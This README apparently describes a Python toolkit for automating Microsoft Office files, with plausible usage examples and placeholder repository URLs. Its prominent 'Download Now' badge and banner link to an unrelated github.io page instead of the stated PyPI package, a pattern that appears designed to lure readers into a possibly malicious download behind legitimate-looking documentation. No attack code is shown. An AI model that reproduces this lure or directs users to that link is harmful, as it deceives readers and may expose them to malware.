# microsoft-office-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://thepostim.github.io/microsoft-hub-c4m/)


[![Banner](banner.png)](https://thepostim.github.io/microsoft-hub-c4m/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI version](https://img.shields.io/badge/pypi-v1.2.0-green.svg)](https://pypi.org)
[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

> A Python toolkit for automating workflows, processing files, and extracting data from Microsoft Office documents on Windows.

---

## ⚠️ Important Notice

**This toolkit is NOT:**
- A method to obtain Microsoft Office licenses
- A replacement for a valid Microsoft 365 or Office 2021 subscription
- Associated with or endorsed by Microsoft Corporation

**This toolkit IS:**
- A Python library for automating tasks with *already-installed* Microsoft Office applications on Windows
- Built on top of well-established libraries like `python-docx`, `openpyxl`, `python-pptx`, and `pywin32`

A valid, licensed installation of Microsoft Office for Windows is required to use the COM automation features of this toolkit.

---

## 📋 Table of Contents

- [Description](#description)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## 📖 Description

**microsoft-office-toolkit** is a Python library that provides a unified interface for automating Microsoft Office workflows on Windows. It wraps COM automation, file parsing, and data extraction into clean, Pythonic APIs — reducing boilerplate and making it straightforward to build pipelines around Word documents, Excel spreadsheets, and PowerPoint presentations.

Whether you are batch-processing `.docx` reports, pulling structured data from `.xlsx` workbooks, or programmatically building slide decks, this toolkit gives you consistent, well-documented tools to get the job done.

---

## ✨ Features

- **Word Automation** — Create, read, modify, and export `.docx` files; mail merge; template rendering
- **Excel Data Extraction** — Read cell ranges, named tables, and pivot data from `.xlsx` / `.xlsm` workbooks
- **PowerPoint Generation** — Build and modify `.pptx` presentations programmatically from data sources
- **Batch File Processing** — Walk directory trees and apply transformations across hundreds of Office files at once
- **COM Bridge (Windows)** — Drive live Office applications via `pywin32` for advanced scenarios (macros, print-to-PDF, etc.)
- **Data Pipeline Helpers** — Export Office data directly to `pandas` DataFrames, JSON, or CSV
- **Format Conversion** — Convert Word and Excel files to PDF using the installed Office print drivers
- **Metadata Inspection** — Extract and update document properties (author, title, keywords, revision history)

---

## 🚀 Installation

### From PyPI

```bash
pip install microsoft-office-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/microsoft-office-toolkit.git
cd microsoft-office-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

```bash
# For pandas DataFrame integration
pip install microsoft-office-toolkit[pandas]

# For full COM automation support on Windows
pip install microsoft-office-toolkit[com]

# Install everything
pip install microsoft-office-toolkit[all]
```

---

## ⚡ Quick Start

```python
from office_toolkit import WordDocument, ExcelWorkbook, PowerPointDeck

# --- Read a Word document ---
doc = WordDocument("report.docx")
print(doc.full_text())

# --- Pull a table from Excel into a DataFrame ---
wb = ExcelWorkbook("sales_data.xlsx")
df = wb.sheet("Q4").table_to_dataframe("SalesTable")
print(df.head())

# --- Build a simple PowerPoint slide ---
deck = PowerPointDeck()
slide = deck.add_slide(layout="title_and_content")
slide.title = "Q4 Sales Summary"
slide.content = df.to_string()
deck.save("summary.pptx")
```

---

## 📚 Usage Examples

### 1. Batch-Convert Word Documents to PDF

```python
from pathlib import Path
from office_toolkit import WordDocument
from office_toolkit.converters import word_to_pdf

source_dir = Path("./reports")
output_dir = Path("./pdf_output")
output_dir.mkdir(exist_ok=True)

for docx_path in source_dir.glob("**/*.docx"):
    pdf_path = output_dir / docx_path.with_suffix(".pdf").name
    word_to_pdf(docx_path, pdf_path)
    print(f"Converted: {docx_path.name} -> {pdf_path.name}")
```

---

### 2. Extract and Analyze Excel Data

```python
from office_toolkit import ExcelWorkbook

wb = ExcelWorkbook("financial_model.xlsx")

# List all sheets
print(wb.sheet_names)

# Read a named range
data = wb.sheet("Income Statement").named_range("Revenue_2023")

# Iterate rows with headers
for row in wb.sheet("Raw Data").iter_rows(header=True):
    if row["Status"] == "Pending":
        print(f"Pending item: {row['Description']} — ${row['Amount']:.2f}")

# Export directly to pandas
import pandas as pd
df = wb.sheet("Raw Data").to_dataframe()
print(df.describe())
```

---

### 3. Mail Merge with a Word Template

```python
from office_toolkit import WordDocument

template = WordDocument("invoice_template.docx")

recipients = [
    {"name": "Acme Corp",    "amount": "4,200.00", "due_date": "2024-02-15"},
    {"name": "Globex Ltd",   "amount": "1,850.00", "due_date": "2024-02-20"},
    {"name": "Initech Inc",  "amount": "9,100.00", "due_date": "2024-02-28"},
]

for record in recipients:
    output = template.mail_merge(record)
    filename = f"invoice_{record['name'].replace(' ', '_')}.docx"
    output.save(filename)
    print(f"Generated: {filename}")
```

---

### 4. Inspect and Update Document Metadata

```python
from office_toolkit import WordDocument, ExcelWorkbook

doc = WordDocument("contract_draft.docx")

# Read existing metadata
meta = doc.metadata
print(f"Author  : {meta.author}")
print(f"Created : {meta.created}")
print(f"Revised : {meta.last_modified_by}")

# Update metadata before distribution
doc.metadata.update(
    author="Legal Department",
    company="Your Company Ltd",
    keywords=["contract", "Q1-2024", "confidential"],
)
doc.save("contract_final.docx")
```

---

### 5. COM Automation — Run an Excel Macro

```python
# Requires: pip install microsoft-office-toolkit[com]
# Requires: Licensed Microsoft Excel installed on Windows

from office_toolkit.com import ExcelApplication

with ExcelApplication(visible=False) as excel:
    wb = excel.open(r"C:\Reports\monthly_report.xlsm")
    excel.run_macro("Module1.FormatAndExport")
    wb.save()
    print("Macro executed successfully.")
```

---

## 📦 Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | `>= 3.8` | Tested on 3.8, 3.10, 3.12 |
| `python-docx` | `>= 1.1.0` | Word document read/write |
| `openpyxl` | `>= 3.1.0` | Excel file processing |
| `python-pptx` | `>= 0.6.23` | PowerPoint automation |
| `pywin32` | `>= 306` | COM bridge *(Windows only, optional)* |
| `pandas` | `>= 2.0.0` | DataFrame export *(optional)* |
| **OS** | Windows 10/11 | Required for COM features; file parsing works cross-platform |
| **Microsoft Office** | 2016 / 2019 / 2021 / 365 | Required for COM automation only |

> **Note:** File reading and writing features (`python-docx`, `openpyxl`, `python-pptx`) work on any platform. COM automation features require a **licensed installation of Microsoft Office on Windows**.

---

## 🤝 Contributing

Contributions are welcome and appreciated.

```bash
# 1. Fork the repository and clone your fork
git clone https://github.com/your-username/microsoft-office-toolkit.git
cd microsoft-office-toolkit

# 2. Create a feature branch
git checkout -b feature/your-feature-name

# 3. Install development dependencies
pip install -e ".[dev]"

# 4. Make your changes, then run the test suite
pytest tests/ -v --cov=office_toolkit

# 5. Lint and format
black office_toolkit/
flake8 office_toolkit/

# 6. Open a Pull Request describing your changes
```

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for our code of conduct and pull request guidelines.

---

## 🐛 Reporting Issues

If you encounter a bug or unexpected behavior, please [open an issue](https://github.com/your-org/microsoft-office-toolkit/issues) and include:

- Your Python version (`python --version`)
- Your OS and Office version
- A minimal reproducible example
- The full traceback

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 🔗 Related Projects & Resources

- [python-docx](https://python-docx.readthedocs.io/) — Low-level Word document library
- [openpyxl](https://openpyxl.readthedocs.io/) — Excel read/write library
- [python-pptx](https://python-pptx.readthedocs.io/) — PowerPoint library
- [pywin32](https://github.com/mhammond/pywin32) — Windows COM and API bindings
- [Microsoft Office Scripts documentation](https://learn.microsoft.com/en-us/office/dev/scripts/) — Official Microsoft developer docs

---

*This project is not affiliated with, sponsored by, or endorsed by Microsoft Corporation. Microsoft Office, Word, Excel, and PowerPoint are registered trademarks of Microsoft Corporation.*